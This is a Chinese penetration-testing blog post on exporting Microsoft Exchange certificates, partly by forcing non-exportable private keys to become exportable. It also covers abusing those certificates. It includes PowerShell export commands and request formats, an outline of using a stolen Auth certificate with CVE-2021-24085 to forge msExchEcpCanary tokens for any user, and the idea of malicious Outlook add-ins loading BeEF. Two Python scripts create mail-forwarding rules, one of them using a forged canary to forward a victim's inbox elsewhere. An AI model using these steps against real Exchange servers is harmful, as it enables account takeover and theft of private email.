---
layout: post
title: Exchange admin center(EAC)开发指南2——证书的导出与利用
---


## 0x00 前言
---

在上篇文章《Exchange admin center(EAC)开发指南》开源了代码[eacManage](https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py)，实现了添加邮箱用户、设置邮箱用户的权限和导出所有邮箱用户列表的功能，本文将要添加证书导出的功能，记录开发细节，分析利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- Exchange证书介绍
- Exchange证书的导出方法
- Exchange证书的利用

## 0x02 Exchange证书介绍
---

参考资料：

https://docs.microsoft.com/en-us/exchange/architecture/client-access/certificates?view=exchserver-2019#certificates-in-exchange

Exchange服务器默认创建以下三个证书：

- Microsoft Exchange，用于加密Exchange服务器、同一计算机上的Exchange服务和从客户端访问服务代理到邮箱服务器上的后端服务的客户端连接之间的内部通信
- Microsoft Exchange Server Auth Certificate，用于OAuth服务器间身份验证和集成
- WMSVC，此Windows自签名证书由IIS中的Web管理服务使用，用于启用远程管理Web服务器及其关联的网站和应用程序

简单理解：

Exchange的网络通信数据使用Microsoft Exchange证书进行加密

身份验证功能需要使用Microsoft Exchange Server Auth Certificate证书，例如生成访问ECP服务时的参数`msExchEcpCanary`

**补充：**

修改Exchange网络通信数据使用的证书位置：

**IIS Manager** -> **Sites** -> **Exchange BackEnd** -> **Bindings...** -> **444** -> **Edit...** -> **SSL certificate**

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/1-1.png)

## 0x03 Exchange证书的导出方法
---

### 1.通过Exchange admin center(EAC)进行界面操作

需要在`servers`->`certificates`页面下进行操作


### 2.Python实现

具体的POST数据包格式如下：

#### (1)获得每个证书的Thumbprint

请求url：/ecp/DDI/DDIService.svc/GetList

参数：

- msExchEcpCanary
- schema

数据格式：application/json

发送内容：

```
{
    "filter":
    {
        "Parameters":
        {
            "__type":
                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "SelectedView":"*"
        }
    },
    "sort":{}
}
```

#### (2)导出证书

请求url：/ecp/DDI/DDIService.svc/SetObject

参数：

- msExchEcpCanary
- schema

数据格式：application/json

发送内容：

```
{
    "identity":
    {
        "__type":"Identity:ECP",
        "DisplayName":"",
        "RawIdentity":<Thumbprint>
    },
    "properties":
    {
        "Parameters":
        {
            "__type":
                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "PlainPassword":<pfxPassword>,
                "FileName":<savePath>
        }
    }
}
```

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py


### 3.通过Exchange Management Shell执行Powershell命令

参考资料：

https://docs.microsoft.com/en-us/exchange/architecture/client-access/export-certificates?view=exchserver-2019

列出所有证书：

```
Get-ExchangeCertificate |fl
```

导出指定证书：

```
Export-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -FileName 'C:\a.pfx' -BinaryEncoded -Password (ConvertTo-SecureString -String 'P@ssw0rd1' -AsPlainText -Force)
```

名称为Microsoft Exchange的证书默认无法使用EAC或Powershell导出，错误提示：

```
A special Rpc error occurs on server XXXX: The private key couldn't be exported as PKCS-12. It either couldn't be accessed or isn't exportable.
```

这是因为该证书的PrivateKeyExportable属性为FALSE

#### 解决方法：生成新的可导出证书替换原证书

参考资料：

https://docs.microsoft.com/en-us/exchange/architecture/client-access/certificate-procedures?view=exchserver-2019

#### (1)定位证书

访问OWA页面，查看证书，获得Thumbprint，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-1.png)

例如测试环境的证书Thumbprint为`5C1F5866F2408CFB8CCD7B66BECBDF99BC279042`

#### (2)生成新的证书

通过Exchange Management Shell执行Powershell命令:

```
Get-ExchangeCertificate -Thumbprint 5C1F5866F2408CFB8CCD7B66BECBDF99BC279042 | New-ExchangeCertificate -Force -PrivateKeyExportable $true
```

返回结果：`5E3D84095391DB650FFC0EF27074B238B3798FB1`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-2.png)

#### (3) 添加证书对IIS服务器的权限

通过Exchange Management Shell执行Powershell命令:

```
Enable-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -Services POP,IMAP,IIS,SMTP
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-3.png)

#### (4)查看新证书

刷新OWA页面，发现证书已更新，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-4.png)

#### (5)导出证书

通过Exchange Management Shell执行Powershell命令:

```
Export-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -FileName 'C:\a.pfx' -BinaryEncoded -Password (ConvertTo-SecureString -String 'P@ssw0rd1' -AsPlainText -Force)
```

## 0x04 Exchange证书的利用
---

### 1.解密Exchange的通信数据

需要导出Microsoft Exchange证书

详情可参考之前的文章[《渗透技巧——Pass the Hash with Exchange Web Service》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service)

### 2.CVE-2021-24085

需要导出Microsoft Exchange Server Auth Certificate证书

利用Microsoft Exchange Server Auth Certificate证书，可以使用[YellowCanary](https://github.com/sourceincite/CVE-2021-24085/blob/main/YellowCanary/Poc/Program.cs)生成指定SID用户登录ECP时使用的参数`msExchEcpCanary`

未打补丁[KB4602269](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-and-2016-february-9-2021-kb4602269-2f3c3a74-094b-6669-2ea0-025101d11f1a)的Exchange服务器在校验身份时，只判断了参数`msExchEcpCanary`是否正确，未对Cookie进行验证，这就导致了攻击者获得Microsoft Exchange Server Auth Certificate证书后，可以生成任意用户(已知SID)的`msExchEcpCanary`参数，获得邮箱用户的ECP控制权限

获得邮箱用户的ECP控制权限后，在利用上有以下思路：

#### (1)上传恶意插件

参考资料：

https://docs.microsoft.com/en-us/office/dev/add-ins/tutorials/outlook-tutorial

开发带有特定功能的Office Web Add-ins，能够读取用户的邮件内容并加载浏览器攻击框架BeEF

限制条件：

Office Web Add-ins需要在Outlook下使用，通过owa读取邮件不会加载Office Web Add-ins

#### (2)添加邮件转发规则

将收件箱收到的邮件转发至另一用户

正常功能的实现代码：

```
#!python3
import requests
import sys
import warnings
import urllib.parse
warnings.filterwarnings("ignore")

def LoginOWA(url, username, password):
    session = requests.session()

    print("[*] Try to login")
    url1 = "https://" + url + "/owa/auth.owa"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    } 
    payload = 'destination=https://%s/owa&flags=4&forcedownlevel=0&username=%s&password=%s&passwordText=&isUtf8=1'%(url, username, password)            

    response = session.post(url1, headers=headers, data=payload, verify = False)

    if 'X-OWA-CANARY' in response.cookies:
        print("[+] Login success")     
    else:
        if "TimezoneSelectedCheck" in response.text:
            print("[+] First login,try to set the display language and home time zone.");
            cookie_obj = requests.cookies.create_cookie(domain=url,name="mkt",value="en-US")
            session.cookies.set_cookie(cookie_obj)
            owa_canary = session.cookies.get_dict()['X-OWA-CANARY']
            url1 = "https://" + url + "/owa/lang.owa"
            payload = 'destination=&localeName=en-US&tzid=Dateline+Standard+Time&saveLanguageAndTimezone=1&X-OWA-CANARY=' + owa_canary          
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
            }
            response = session.post(url1, headers=headers, data=payload, verify = False)            
            if response.status_code == 200:
                print("[+] Login success")
            else:
                print("[!] Login error: " + str(response.status_code))
                exit(0)           
        else:
            print("[!] Login error")
            exit(0)

    url2 = "https://" + url + "/ecp/"
    response = session.get(url2, headers=headers, verify = False)  
    msExchEcpCanary = response.cookies['msExchEcpCanary']
    print("    msExchEcpCanary:" + msExchEcpCanary)
    return session,msExchEcpCanary

def test():
    url = "192.168.1.1"
    user = "test1"
    password = "Password123"
    session,msExchEcpCanary = LoginOWA(url, user, password)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    p = {
            "msExchEcpCanary": msExchEcpCanary
        }
    d = {"properties":{"ForwardTo":[{"RawIdentity":"test2@test.com","DisplayName":"test2","Address":"test2@test.com","AddressOrigin":0,"galContactGuid":"2cc82f35-2a13-449c-ab48-3843a7f2b615","RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"test2@test.com"}],"Name":"1","StopProcessingRules":"true"}}

    url3 = "https://" + url + "/ecp/RulesEditor/InboxRules.svc/NewObject"
    response = session.post(url3, headers=headers, params=p, json=d, verify = False)
    print(response.text)
    
if __name__ == '__main__':
    test()
```

CVE-2021-24085的实现代码：

```
#!python3
import requests
import sys
import warnings
import urllib.parse
warnings.filterwarnings("ignore")

def test():
    url = "192.168.1.1"
    msExchEcpCanary = "P7btz10TmkSS6_-vY8gG2uAKFEimJNkItU-6jJR0jbZcA7rCcR0O5CYxhyrW5kI6oeKC-sUM3Vw."
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    p = {
            "msExchEcpCanary": msExchEcpCanary
        }
    d = {"properties":{"ForwardTo":[{"RawIdentity":"test2@test.com","DisplayName":"test2","Address":"test2@test.com","AddressOrigin":0,"galContactGuid":"2cc82f35-2a13-449c-ab48-3843a7f2b615","RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"test2@test.com"}],"Name":"1","StopProcessingRules":"true"}}

    url3 = "https://" + url + "/ecp/RulesEditor/InboxRules.svc/NewObject"
    response = requests.post(url3, headers=headers, params=p, json=d, verify = False)
    print(response.text)
    
if __name__ == '__main__':
    test()
```

## 0x05 小结
---

本文对Exchange证书的导出方法和利用思路进行介绍，更新代码[eacManage](https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py)，添加导出证书的功能，记录实现细节。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



